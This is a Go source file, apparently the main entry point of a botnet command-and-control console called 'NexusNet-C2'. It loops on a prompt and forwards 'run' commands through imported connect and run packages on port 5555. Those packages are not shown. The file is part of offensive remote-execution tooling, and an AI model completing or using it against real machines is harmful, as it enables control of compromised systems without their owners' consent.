package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	connect "lbot.init/project/cmd/connect"
	run "lbot.init/project/cmd/run"
	banner "lbot.init/project/pkg/banner"
	clear "lbot.init/project/pkg/clear"
)

func main() {
	clear.ClearTerminal()
	banner.Pbanner()
	scaner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("NexusNet-C2#> ")
		scaner.Scan()
		input := scaner.Text()

		if strings.ToLower(input) == "exit" {
			fmt.Println("Have Nice Hacking")
			break
		}

		if strings.ToLower(input) == "clear" {
			clear.ClearTerminal()
			banner.Pbanner()
		}

		if strings.HasPrefix(strings.ToLower(input), "run ") {
			excutec := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(input), "run "))
			customPort := 5555
			connect.Connect()
			run.Run(excutec, customPort)
		}

	}
}
